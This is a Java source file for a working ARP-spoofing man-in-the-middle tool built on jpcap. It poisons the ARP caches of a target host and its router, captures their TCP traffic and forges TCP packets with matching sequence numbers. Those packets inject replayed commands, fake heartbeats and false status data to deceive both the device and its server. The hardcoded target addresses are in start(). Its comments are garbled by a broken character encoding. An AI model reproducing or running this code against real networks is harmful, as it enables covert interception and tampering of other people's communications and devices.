package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.CyclicBarrier;

import org.omg.CORBA.PUBLIC_MEMBER;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import Factory.ARPFactory;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost_2 {
	
	

	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	static Object flag = new Object(); 
	
	//����ץȡ���������ݰ���ÿ��ץȡ���������
	CopyOnWriteArrayList<Packet> pakage_up = new CopyOnWriteArrayList<Packet>();
	
	//����ץȡ���������ݰ���ÿ��ץȡ���������
	CopyOnWriteArrayList<Packet> pakage_down = new CopyOnWriteArrayList<Packet>();
	
	//˫�߳�����������
	final  CyclicBarrier cb = new CyclicBarrier(2);
	
	//�������ݶ���
	List<Model_a> counter_data_list = new ArrayList<Model_a>();
	
	//��ʱδʹ��
	//�������ݶ���(����)
	List<Model_a> counter_heart_list_toHost = new ArrayList<Model_a>();
	List<Model_a> counter_heart_list_toService = new ArrayList<Model_a>();
	
	//α��״̬����
	List<Model_a> fake_status_list_toService = new ArrayList<Model_a>();
	
	//�����ļ�
	static int ARP_INTERVAL;
	static int NETCARD_INDEX;
	
	static String HOST_IP;
	static String SERVICE_IP;
	static String ROUTE_IP;
	
	static String YOUR_DEVICE_MAC;
	static String TARGET_HOST_MAC;
	static String TARGET_ROUTE_MAC;
	
	static String COUNTER_DATASOURCE;
	static int[] INT_INDEX;
	static int[] HEART_INDEX_UP;
	static int[] HEART_INDEX_DOWN;
	
	static int[] STATUS_INDEX_TOSERVICE;
	
	{
		readProperties();
		
	}
	
	
	
	/*************************************************
	 * ������������ʹ��
	 *************************************************/	
	public static void main(String[] args) {
		
		Manager_cheatServiceAndHost_2 mc= new Manager_cheatServiceAndHost_2();
		
		JpcapSender js = getCrad(NETCARD_INDEX);
		
		//��ȡ�������ݰ�������
		
		/*************************************************
		 * ��ץȡ�����ݰ���÷������ݶ���
		 *************************************************/
		mc.recognazion_command(COUNTER_DATASOURCE,INT_INDEX,HEART_INDEX_UP,HEART_INDEX_DOWN);
		
		/*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************/                                                       
		mc.setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		/************************************************* 
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************/
		mc.sentThread(js);
		
		/*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************/
		mc.capPacket_run(NETCARD_INDEX,HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
		 * ģʽһ��ֻת������
		 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
		 *************************************************/
		mc.fakeThread(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC);
		
	}
	
	
	/*************************************************
	 * ��������,Ϊ���������ʱ�ṩ�ӿ�
	 *************************************************/
	public void start(){
		
		//��ȡ�������ݰ�������
				JpcapSender js = getCrad(0);
				
				/*************************************************
				 * ��ץȡ�����ݰ���÷������ݶ���
				 *************************************************/
				recognazion_command(COUNTER_DATASOURCE,INT_INDEX,HEART_INDEX_UP,HEART_INDEX_DOWN);
				
				/*************************************************
				 * α��ARP���ݣ���ӵ��������б���
				 *************************************************/
				setARPs("192.168.1.100","192.168.8.1","60:d8:19:4a:b2:fc","AC:CF:23:87:BD:2E","E4:D3:32:E0:7B:82");
				
				
				/************************************************* 
				 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
				 *************************************************/
				sentThread(js);
				
				/*************************************************
				 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
				 * ���Ҽ����α�����ݼ��뵽�����б�
				 *************************************************/
				capPacket_run(0,"192.168.8.100","119.29.42.117","60:d8:19:4a:b2:fc");
				
				/*************************************************
				 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
				 * ģʽһ��ֻת������
				 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
				 *************************************************/
				fakeThread(2,"60:d8:19:4a:b2:fc","AC:CF:23:87:BD:2E",TARGET_ROUTE_MAC);	
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ��ץȡ�����ݰ���ʶ����������ݶ���
	 *************************************************/
	public void recognazion_command(final String path,final int[] int_index,final int[] heart_index_up,final int[] heart_index_down){
		Runnable run = new Runnable() {
			
			@Override
			public void run() {
				
				//����Ҫʶ��һ����������·������������������ݣ�����������������ͨ��
				wireless802_airdump1 w = new wireless802_airdump1();
				List<Model_a> ls = w.ergodic(path);
				counter_data_list = w.getFrameByindex(int_index,ls);
				
				if(counter_data_list.size() != 0){
					System.out.println("�����ɹ������ɷ������ݶ���........");
					System.out.println("length:"+counter_data_list.size());
				}else {
					System.out.println("���ƶ��л�ȡʧ��");
				}
				
				if(heart_index_up.length != 0){
					counter_heart_list_toService = w.getFrameByindex(heart_index_up, ls);	
					if(counter_heart_list_toService.size() != 0){
						System.out.println("�����ɹ�������α����������toService........");
						System.out.println("length:"+counter_heart_list_toService.size());
					}
				}else {
					System.out.println("δ������������ģʽ����������toServiceδ����");
				}
				
				if(heart_index_down.length != 0){
					counter_heart_list_toHost = w.getFrameByindex(heart_index_down, ls);	
					if(counter_heart_list_toHost.size() != 0){
						System.out.println("�����ɹ�������α����������toHost........");
						System.out.println("length:"+counter_heart_list_toHost.size());
					}
				}else {
					System.out.println("δ������������ģʽ����������toHostδ����");
				}
				
				
				if(STATUS_INDEX_TOSERVICE.length != 0){
					fake_status_list_toService = w.getFrameByindex(STATUS_INDEX_TOSERVICE, ls);	
					if(fake_status_list_toService.size() != 0){
						System.out.println("�����ɹ�������α��״̬����toService........");
						System.out.println("length:"+fake_status_list_toService.size());
					}
				}
				
					try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e){
						e.printStackTrace();
					}
			}
		};
		
		System.out.println("��ʼ�������ƶ���");
		new Thread(run).start();
	}
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP
	 *************************************************/
	public  void capPacket_run(int i,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("����ץ���߳�");
					//�Ƿ�ÿһ����Ҫ��ͬ��Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(true){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("׼����ȡ��"+i+"�������ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	    //��Captor�ŵ������߳�������    
	   public  void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip,TestPacketReceiver pr){    
	       //JpcapCaptor jp=jpcap;    
    	  // while(true){}    
  		 //ʹ�ýӰ�������ѭ��ץ��-1��ʾ�����Ƶ�ץȡ���ݰ�   "192.168.8.101","119.29.42.117"
  		  jpcap.loopPacket(1, pr);
  		  
  		  if(pr.getPacket() != null){

  			  Packet packet = pr.getPacket();
  			  //TCP֡ 
  			  if(packet instanceof jpcap.packet.TCPPacket){
  				  TCPPacket tcpPacket = (TCPPacket)packet;
  				  
  				  if(tcpPacket.syn){
  					  
  					  System.out.println("����֡......����cpmodelʧ��");
  					  	
  				  }
  				  //&&service_ip.equals(tcpPacket.dst_ip.getHostAddress())
  				//��������
  				  else if(host_ip.equals(tcpPacket.src_ip.getHostAddress())){
  					  if(pakage_up.size() == 0){
  						
  						 pakage_up.add(tcpPacket);
  						 System.out.println("��������");
  						 System.out.println("packet_up��ʼ���ɹ�");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_up.get(0);
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							
  							 // System.out.println("�ظ�֡��δ����packet_up");
  						  }else{
  							  
  							  pakage_up.set(0, tcpPacket);
  							  System.out.println("��������");
  							  System.out.println("�����ݣ�����packet_up");
  						  }
  						  
  					  }
  					  
  				  }
  				  //&&service_ip.equals(tcpPacket.src_ip.getHostAddress())
  				//����������
  				  else if(host_ip.equals(tcpPacket.dst_ip.getHostAddress())){
  					  if(pakage_down.size() == 0){
  						  pakage_down.add(tcpPacket);
  						 System.out.println("��������");
  						  System.out.println("packet_down��ʼ��");
  					  }
  					  else{
  						  TCPPacket packet2 = (TCPPacket) pakage_down.get(0); 
  						  if(packet2.ack_num == tcpPacket.ack_num&&packet2.sequence == tcpPacket.sequence&&packet2.data.length==tcpPacket.data.length){
  							  
  							  //System.out.println("�ظ�֡��δ����packet_down");
  						  }else{
  							  pakage_down.set(0, tcpPacket);
  							 System.out.println("��������");
  							  System.out.println("�����ݣ�����packet_down");
  						  }	  
  					  }
  				  }
  			  }	  
  			  
  		  }  
  	   
       
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	 /*************************************************
	 * �����߳�
	 *************************************************/
	   public void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						//��ͣ�ķ���
						while(true){
							if(js != null){
									
								Packet packet = sendQueue.take();
								if(packet instanceof jpcap.packet.ARPPacket){
									
									System.out.println("sending arp.."); 
									
								}
								if(packet instanceof jpcap.packet.TCPPacket){
									
									TCPPacket tcpPacket = (TCPPacket)packet;
									System.out.println("sending TCPtohost.."+"seq|"+tcpPacket.sequence+
														" ack|"+tcpPacket.ack_num);
								}
								
								js.sendPacket(packet);
							}
							
						}
					} catch (Exception e) {
						System.out.println("���������̳߳���");
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			//new Thread(runner).start();
		   System.out.println("�����߳�����");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs����
	 *************************************************/
	   public  void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		  
		   ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				Set<ARPPacket> ARPs = null;
				Iterator<ARPPacket> it = null;
				while(true){
					ARPs = arpFactory1.getInstance();
					it = ARPs.iterator();
					//��arp���뷢�Ͷ���
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//ÿ����һ��ָֹͣ����ʱ��ARP_INTERVAL
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  /*************************************************
	 * α�����ݰ��߳�,��Ϊ����ģʽ
	 *************************************************/
	  public  void fakeThread(int flags,final String  yourMAC,final String hostMAC,final String rounteMAC){
		   
		   //ģʽһΪֱ��ת�����յ�������

		   //ģʽ2Ϊ���ضԷ�����,ת���Լ�α�������
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("���뵽α���߳�1");
					  // int step = 0;
					   try {
							  //�ȴ����ƶ��д����ɹ�
							cb.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   
					   Packet packet_up = null;
					   Packet packet_down = null;
					   
					  while(true){	
						  	//�������豸�ķ���ͨ��
						  if(pakage_up.size() != 0){/*
							  if(pakage_up.get(0) instanceof TCPPacket){
								  if(packet_up == null){
									  	//����TCP����
										  packet_up = pakage_up.get(0);
										  //ִ��α������
										  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_up,rounteMAC);
										  if(fakeTCP != null){
											  step++;
											  try {
													sendQueue.put(fakeTCP);
													System.out.println("���뷢�Ͷ���......");
												} catch (InterruptedException e) {
													// TODO Auto-generated catch block
													e.printStackTrace();
												}
										  }
										  
									  }else {
										  	//�ȴ�ͬ����������ȡpaket�Ƚ������packet_up��ͬ��ִ��α�����ݣ������޲���
										  TCPPacket packet1 = (TCPPacket)packet_up;
										  TCPPacket packet2 = (TCPPacket)pakage_up.get(0);
										  
										  if(packet1.ack_num != packet2.ack_num || packet1.sequence != packet2.sequence || packet1.data.length!=packet2.data.length){
											  packet_up = pakage_up.get(0);
											  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_up,rounteMAC);
											  if(fakeTCP != null){
												  step++;
												  try {
														sendQueue.put(fakeTCP);
														System.out.println("up���뷢�Ͷ���......");
													} catch (InterruptedException e) {
														// TODO Auto-generated catch block
														e.printStackTrace();
													}
												  
											  }
										  }
									  }
							  }*/
							  	
							  ////////////
							  fake(packet_up, pakage_up, yourMAC, hostMAC, rounteMAC);
							  
						  }
 
						  //�������ķ���ͨ��
						  if(pakage_down.size() != 0){
							 /* if(pakage_down.get(0) instanceof TCPPacket){
								  if(packet_down == null){
									  	//����TCP����
										  packet_down = pakage_down.get(0);
										  //ִ��α������
										  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_down,rounteMAC);
										  if(fakeTCP != null){
											  step++;
											  try {
													sendQueue.put(fakeTCP);
													System.out.println("���뷢�Ͷ���......");
												} catch (InterruptedException e) {
													// TODO Auto-generated catch block
													e.printStackTrace();
												}
										  }
										  
									  }else {
										  	//�ȴ�ͬ����������ȡpaket�Ƚ������packet_up��ͬ��ִ��α�����ݣ������޲���
										  TCPPacket packet1 = (TCPPacket)packet_down;
										  TCPPacket packet2 = (TCPPacket)pakage_down.get(0);
										  
										  if(packet1.ack_num != packet2.ack_num || packet1.sequence != packet2.sequence || packet1.data.length!=packet2.data.length){
											  packet_down = pakage_down.get(0);
											  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,step,(TCPPacket)packet_down,rounteMAC);
											  if(fakeTCP != null){
												  try {
														sendQueue.put(fakeTCP);
														System.out.println("down���뷢�Ͷ���......");
													} catch (InterruptedException e) {
														// TODO Auto-generated catch block
														e.printStackTrace();
													}
												  
											  }
										  }
									  }
							  }
							  */
							  
							  ///////////////
							  fake(packet_down, pakage_down, yourMAC, hostMAC, rounteMAC);
						  }
					 }
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	   * end
	   *************************************************/
	  
	 public void fake(Packet oldpacket,CopyOnWriteArrayList<Packet> packets,String  yourMAC,String hostMAC,String rounteMAC){
		 

		  if(packets.get(0) instanceof TCPPacket){
			  if(oldpacket == null){
				  	  //����TCP����
				  	  oldpacket = packets.get(0);
					  //ִ��α������
					  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,0,(TCPPacket)oldpacket,rounteMAC);
					  if(fakeTCP != null){  
						  try {
								sendQueue.put(fakeTCP);
								System.out.println("���뷢�Ͷ���......");
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
					  }
					  
				  }else {
					  	//�ȴ�ͬ����������ȡpaket�Ƚ������packet_up��ͬ��ִ��α�����ݣ������޲���
					  TCPPacket packet1 = (TCPPacket)oldpacket;
					  TCPPacket packet2 = (TCPPacket)packets.get(0);
					  
					  if(packet1.ack_num != packet2.ack_num || packet1.sequence != packet2.sequence || packet1.data.length!=packet2.data.length){
						  oldpacket = packets.get(0);
						  TCPPacket fakeTCP = fakeTCP(yourMAC,hostMAC,0,(TCPPacket)oldpacket,rounteMAC);
						  if(fakeTCP != null){
							  try {
									sendQueue.put(fakeTCP);
									System.out.println("���뷢�Ͷ���......");
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							  
						  }
					  }
				  }
		  }
		  		 
	 }
	  
	   
	   /*************************************************
	 * ����α�����Ҫ���͵�TCP֡
	 *************************************************/
	   public  TCPPacket fakeTCP(String  yourMAC,String hostMAC,int step,TCPPacket tcpPacket,String routeMAC){
		   
		   SetTCP st = new SetTCP();
		   TCPPacket tcp = null;
		   //int total = counter_data_list.size();
		   
		 
		   //����Ҫα���������α��Ϊ����������������
		   //�ȼ����seq ack
		   
		   long seq = 0;
		   long ack = 0;
		   
		   if(tcpPacket.syn){
			   
			   //SYN����֡
			   
		   }
		   else if(tcpPacket.ack && !tcpPacket.psh){

				   seq = tcpPacket.ack_num;
				   ack = tcpPacket.sequence;       
				   
		   }
		   else if(tcpPacket.ack && tcpPacket.psh){
			   
			   
			   //����SEQ��ACK
			   seq = tcpPacket.ack_num;
			   ack = tcpPacket.sequence + tcpPacket.data.length;	  
		 }   
		   
		   //tcpPacket.dst_ip.getHostAddress().equals(SERVICE_IP)&&
		   if(tcpPacket.src_ip.getHostAddress().equals(HOST_IP)){
			   
			   if(seq != 0){
				   
				   //int index = step;
				   if(counter_data_list.size()>0){
					   
					   System.out.println("α�췢���豸������������.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, hostMAC, counter_data_list.get(0));
					   //
					   counter_data_list.remove(0);
					   
		System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
					    
				   }
				   else {	   
					   //��������ɷ��ƶ��е����ݺ���������ظ��������ݣ��ż���α��ACK�ظ������򲻻ظ�
					   if(tcpPacket.data.length != 0){ 
						   if(counter_heart_list_toHost.size() != 0&&tcpPacket.data.length<305){
							   System.out.println("α�췢���豸������������.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, hostMAC, counter_heart_list_toHost.get(0));
							  
				System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
						   }else{
							   System.out.println("α�췢���豸������������.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, hostMAC, null);
				System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack); 		   
						   }
						   
					   }   
				   }
				  	   
			   }   
		   }else if(tcpPacket.dst_ip.getHostAddress().equals(HOST_IP)){
			  
			   		if(tcpPacket.data.length >= 67 && fake_status_list_toService.size()!=0){
			   			
			   		 System.out.println("α��״̬���ݷ�����������������.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, routeMAC, fake_status_list_toService.get(0));
					   System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
			   		}
			   		else if(counter_heart_list_toService.size() != 0){
			   			
					   System.out.println("α�췢����������������.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, routeMAC, counter_heart_list_toService.get(0));
					   System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
					   
				   }else {
					   
					   System.out.println("α�췢����������������.....");
					   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
				    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
				    			 yourMAC, routeMAC, null);
					   System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack);
				}
		   }
		  return tcp; 
	   } 
	   
	   /*************************************************
	 * end
	 *************************************************/


		
		 /*************************************************
			 * ��ȡ�����������ݵ�����
			 *************************************************/
		public static JpcapSender getCrad(int deviceNum){
				  
					NetworkInterface[] devices = null;
					 try{    
						 //��ȡ�����ϵ�����ӿڶ�������    
						  devices = JpcapCaptor.getDeviceList();
		System.out.println("������ȡ�ɹ�  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
			System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
		System.out.println("�ѻ�ȡ����(����ʹ��)  "+deviceNum+"  JSender�����ɹ�");  				
					} catch (IOException e1) {
			System.out.println("JSender�������ɹ�");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		
		
		
		/*************************************************
		 * ��ȡ�����ļ�prameter.properties
		 *************************************************/
		  public void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/counterProperties.properties" );    
		        try  {    
		           prop.load(in);    
		 
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim()); 
		           NETCARD_INDEX = Integer.parseInt(prop.getProperty( "NETCARD_INDEX" ).trim());
		           HOST_IP = prop.getProperty( "HOST_IP" ).trim();
		           if(!prop.getProperty( "SERVICE_IP" ).trim().equals("")){
		        	   SERVICE_IP = prop.getProperty( "SERVICE_IP" ).trim();  
		           }else {
		        	   SERVICE_IP = null;
				}
		           
		           ROUTE_IP = prop.getProperty( "ROUTE_IP" ).trim();
		           YOUR_DEVICE_MAC = prop.getProperty( "YOUR_DEVICE_MAC" ).trim();
		           TARGET_HOST_MAC = prop.getProperty( "TARGET_HOST_MAC" ).trim();
		           TARGET_ROUTE_MAC = prop.getProperty( "TARGET_ROUTE_MAC" ).trim();
		           COUNTER_DATASOURCE =  prop.getProperty( "COUNTER_DATASOURCE" ).trim();
		           
		           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
		           if(ss1.length != 0){ 
		        	   INT_INDEX = new int[ss1.length];
		        	   for(int i = 0;i<ss1.length;i++){  
			        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
			           } 
		           }
		           
		           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
		           if(!ss2[0].equals("")){ 
		        	   HEART_INDEX_UP = new int[ss2.length];
		        	   for(int i = 0;i<ss2.length;i++){  
		        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
			           } 
		           }
		           
		           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
		      
		           if(!ss3[0].equals("")){ 
		        	   HEART_INDEX_DOWN = new int[ss3.length];
		        	   for(int i = 0;i<ss3.length;i++){  
		        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
			           } 
		           }
		           
		           
		           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
				      
		           if(!ss4[0].equals("")){ 
		        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
		        	   for(int i = 0;i<ss4.length;i++){  
		        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
			           } 
		           }
		           
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		        
		        /*
		        File fileB = new File( this.getClass().getResource( "" ).getPath());  
		        
		        System. out .println( "fileB path: " + fileB);*/  
		  }
		  /*************************************************
		 * end
		 *************************************************/
}    